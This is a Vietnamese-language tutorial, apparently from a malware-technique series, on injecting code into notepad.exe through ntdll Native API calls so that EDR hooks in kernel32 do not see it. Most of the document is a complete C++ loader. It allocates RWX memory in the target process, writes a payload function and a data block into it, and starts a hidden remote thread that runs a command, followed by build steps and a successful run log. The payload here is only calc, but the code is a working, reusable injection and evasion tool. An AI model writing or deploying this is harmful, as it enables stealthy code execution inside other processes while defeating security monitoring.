
---

# 📝 [PE 23] NTAPI Injection (Direct Native API Execution)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**NTAPI Injection (Can thiệp bộ nhớ qua cổng Native API)** đại diện cho giải thuật can thiệp không gian ảo và điều phối luồng xử lý chuyên sâu, thuộc phân hệ **Né tránh cơ chế bẫy Hook tầng Win32 Subsystem (Win32 API Layer Evasion)**.

Mọi chương trình phần mềm thông thường trên hệ điều hành Windows khi có ý đồ can thiệp bộ nhớ ảo chéo tiến trình đều phải sử dụng các hàm Win32 API phổ thông đã được tài liệu hóa (Documented APIs). Tuy nhiên, phân hệ bọc ngoài này chính là "tử huyệt" bảo mật tĩnh và động, nơi các giải pháp Endpoint Detection and Response (EDR) ưu tiên thiết lập mật độ bẫy giám sát User-mode Inline Hooks dày đặc kịch trần.

Dự án PE 23 hóa giải triệt để rào cản này bằng chiến thuật **Gạt bỏ lớp thông dịch Win32 (Subsystem Interception Bypass)**. Loader thực hiện phân giải và triệu hồi trực tiếp các System Calls bọc ngoài do thư viện lõi `ntdll.dll` xuất bản (nhóm Native APIs mang tiền tố `Nt/Zw`). Dòng chảy tham số dữ liệu và điều phối lệnh CPU được vận chuyển thẳng từ không gian ảo của Loader xuống cấu trúc quản lý thuộc nhân Kernel thông qua phân hệ cổng Native, bẻ gãy hoàn toàn khả năng bắt chặn và ghi nhật ký của các cảm biến an ninh đặt tại tầng Win32 Subsystem (`kernel32.dll` / `KernelBase.dll`).

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Win32 Hooks**: Vượt qua hàng rào giám sát cuộc gọi liên tiến trình của EDR bằng cách luồn lách dòng chảy thực thi xuống tháp hàm Native API.
* **Làm chủ quy chuẩn tham số Native Subsystem**: Nghiên cứu kiến trúc cấu hình cấu trúc dữ liệu đặc thù của các hàm nhân (`NTSTATUS` Return Taxonomy) và cơ chế quản lý con trỏ cấp thấp.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc phân lớp (Layered Architecture) của hệ điều hành Windows, phân hệ Win32 Subsystem thực chất chỉ đóng vai trò là một lớp thông dịch trung gian (Wrapper Layer). Khi mã nguồn ứng dụng phát lệnh triệu hồi một hàm như `VirtualAllocEx`, phân hệ bọc trong của Microsoft (`kernel32.dll`) sẽ thực hiện chuyển đổi cấu trúc tham số đầu vào, thiết lập bản ghi và phát lệnh gọi xuống hàm Native tương ứng là `NtAllocateVirtualMemory` sống lọt lòng `ntdll.dll` trước khi CPU thực thi lệnh ngắt hệ thống **`syscall`** để hạ cánh xuống Ring 0.

Quy trình giải phẫu bản đồ RAM và chọc thủng phân hệ bọc ngoài Win32 được điều phối ngầm qua 4 giai đoạn cấu trúc:

```
[Mở Handle] ──> [NtAllocateVirtualMemory: Phân bổ trang thực thi chéo tiến trình từ xa]
                     └──> [NtWriteVirtualMemory: Bơm mã máy PIC và bảng dữ liệu tham số]
                               └──> [NtCreateThreadEx: Khởi tạo luồng Native kích nổ Payload]

```

1. **Bóc tách con trỏ Native ngầm**: Loader phối hợp sử dụng giải thuật phân giải động trỏ thẳng vào vùng nhớ ảo của `ntdll.dll` nhằm trích xuất tọa độ Base Address sống của tháp hàm Native tối cao: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, và `NtCreateThreadEx`.
2. **Cấp phát bộ nhớ ảo tầng thấp (`NtAllocateVirtualMemory`)**: Khác biệt hoàn toàn với các tham số đơn giản của Win32 API, hàm Native API yêu cầu mã nguồn truyền địa chỉ vùng nhớ dưới dạng con trỏ cấp hai (`PVOID* BaseAddress`) cùng thông số độ rộng vùng nhớ dưới dạng tham chiếu chỉ mục (`PSIZE_T RegionSize`). Nhân Kernel tiếp nhận lệnh, trực tiếp phân bổ dải trang nhớ mang cờ đặc quyền **`PAGE_EXECUTE_READWRITE` (RWX)** lọt lòng tiến trình mục tiêu.
3. **Bơm dữ liệu trực tiếp chéo tiến trình (`NtWriteVirtualMemory`)**: Loader thực hiện lệnh ánh xạ mảng byte dữ liệu tuyệt đối toán học và khối mã máy PIC trực tiếp sang bộ nhớ RAM của đối phương thông qua cổng Native, hoàn toàn không thông qua lớp đệm thông dịch bọc ngoài, triệt tiêu chỉ dấu sinh nhật ký Win32.
4. **Khai hỏa luồng Native Object (`NtCreateThreadEx`)**: Hàm Native tối cao này thiết lập một cấu trúc Thread Object nằm lọt lòng danh bạ quản lý của tiến trình mục tiêu (`notepad.exe`) mà không cần sự thông qua của lớp quản lý luồng cấp Win32, cưỡng bách CPU đối phương bước vào chu kỳ rút lệnh thực thi Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** kết hợp quy trình quản lý và xử lý mã lỗi hệ thống `NTSTATUS` chuẩn chỉ kịch trần bảo mật hệ thống.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa các cấu trúc dữ liệu và nguyên mẫu con trỏ hàm đặc thù của Native API
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteProcessMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN LPCVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
DWORD WINAPI RemoteNativePayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
                processID = pe32.th32ProcessID; 
                break; 
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 23: DIRECT NATIVE API (NTAPI) INJECTION FLAT" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Phân giải động các cổng Native API trực tiếp từ ntdll.dll để bypass Win32 bọc ngoài hoàn toàn
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteProcessMemory NtWriteVirtualMemory = (pNtWriteProcessMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giaii he thong Native APIs tho!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da bat dong bo va anh xa thanh cong thap ham NTAPI." << std::endl;

    // ─── BƯỚC 1: NTALLOCATEVIRTUALMEMORY - CẤP PHÁT BỘ NHỚ TẦNG THẤP TỪ XA CHÉO RAM ───
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động thích ứng
    
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= NtAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] NtAllocateVirtualMemory failed! STATUS Code: 0x" << std::hex << status << std::endl;
        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat trang thuc thi qua NTAPI tai RAM: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ phục vụ ánh xạ chéo bộ nhớ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 2: NTWRITEVIRTUALMEMORY - BƠM MÃ MÁY VÀ BẢNG THAM SỐ TUYỆT ĐỐI CHÉO RAM ───
    status = NtWriteVirtualMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteNativePayload, 500, NULL);
    status |= NtWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    if (status != 0) {
        std::cerr << "[-] NtWriteVirtualMemory that bai! STATUS Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Nap ma may va tham so tuyet doi vao xac Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: NTCREATETHREADEX - KÍCH NỔ LUỒNG NATIVE TỪ XA CHÉO TIẾN TRÌNH ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa..." << std::endl;
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] NTAPI Direct Injection Process Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Đóng Handle thiết lập kết nối nhằm bảo an cấu trúc triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh NTAPI. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru không phụ thuộc môi trường khi mang sang môi trường máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn thư viện CRT lọt lòng file thực thi `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng mục tiêu `Notepad.exe` trên môi trường Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành để theo dõi ma trận thực thi tầng thấp:

```powershell
PS C:\Workspace\x64\Release> .\PE23_NTAPI_Injection.exe
====================================================
[*] PE 23: DIRECT NATIVE API (NTAPI) INJECTION FLAT
====================================================
[+] Da tim thay Notepad.exe voi PID: 12588
[+] Da bat dong bo va anh xa thanh cong thap ham NTAPI.
[+] Cap phat trang thuc thi qua NTAPI tai RAM: 0x000001FA8C7F0000
[+] Nap ma may va tham so tuyet doi vao xac Notepad hoan tat.
[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa...
[+] NTAPI Direct Injection Process Executed Successfully!

[*] Hoan thanh quy trinh NTAPI. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm thực thi Native API:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Cấu trúc can thiệp dứt điểm thành công xuất sắc, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung kịch nền**!
* Do mã nguồn Loader hoàn toàn giải phóng sự phụ thuộc vào các cuộc gọi liên tỉnh mức Win32 Subsystem, các bẫy giám sát cuộc gọi bọc ngoài đặt tại User-mode của EDR Engine đều bị vượt qua một cách hoàn toàn sạch bóng.
* Dòng chảy System Call đi thẳng từ Ring 3 xuống Ring 0 thông qua các cổng Native không tài liệu hóa (`Undocumented Entries`), khẳng định bệ phóng bảo mật lý tưởng của phân hệ can thiệp tầng thấp!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Architecture**: *Windows Core Internal Functions & NtAllocateVirtualMemory Spec Specifications* - Windows Native API Reference Guide.
* **Gary Nebbett**: *Windows NT/2000 Native API Reference* - In-depth structural documentation on undocumented entry points.
* **Phineas (Malware Evasion Frameworks)**: *Bypassing User-Mode Win32 Hooks via Subsystem-Level Native Calling Conventions*.
* **MITRE ATT&CK Matrix System**: *Defense Evasion: Native API Execution (T1106)* & *Process Injection (T1055)*.

---